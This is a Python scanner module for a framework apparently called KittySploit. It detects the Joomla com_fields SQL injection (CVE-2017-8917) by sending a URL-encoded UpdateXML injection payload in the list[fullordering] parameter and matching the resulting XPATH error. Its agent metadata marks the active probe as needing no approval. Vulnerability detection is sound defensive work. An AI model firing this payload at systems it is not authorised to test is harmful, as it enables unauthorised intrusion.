#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla com_fields SQLi (CVE-2017-8917)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla - com_fields SQLi Detection (CVE-2017-8917)',
        'description': (
            'Detects CVE-2017-8917 by sending UpdateXML payload via com_fields list fullordering '
            'and matching XPATH syntax error .255. in a 500 response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'joomla', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-8917',
            'https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html',
        ],
        'cve': 'CVE-2017-8917',
    }

    def run(self):
        for base in ('', '/joomla', '/cms'):
            login = f'{base}/index.php/component/users/?view=login'
            r = self.http_request(method='GET', path=login, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            # cookie from response
            cookie = None
            for k, v in r.headers.items():
                if k.lower() == 'set-cookie':
                    cookie = v.split(';')[0].strip()
                    break
            if not cookie:
                continue
            m = re.search(
                r'<input\s+type="hidden"\s+name="([^"]+)[^>]*>.*?</fieldset>',
                r.text or '',
                re.I | re.S,
            )
            if not m:
                continue
            fieldset = m.group(1)
            sqli = (
                f'{base}/index.php?option=com_fields&view=fields&layout=modal&view='
                f'fields&layout=modal&option=com_fields&{fieldset}=1&'
                'list%5Bfullordering%5D=UpdateXML%282%2C+concat%280x3a%2C128%2B127%2C+0x3a%29%2C+1%29'
            )
            g = self.http_request(
                method='GET', path=sqli, headers={'Cookie': cookie}, allow_redirects=False,
            )
            if not g or g.status_code != 500:
                continue
            body = g.text or ''
            if 'Home Page<' in body and re.search(
                r"XPATH syntax error:\s*&#039;\.255\.&#039;\s*</", body
            ):
                self.set_info(
                    severity='critical',
                    reason='Joomla com_fields SQLi (CVE-2017-8917)',
                    path='/index.php?option=com_fields',
                )
                return True
        return False
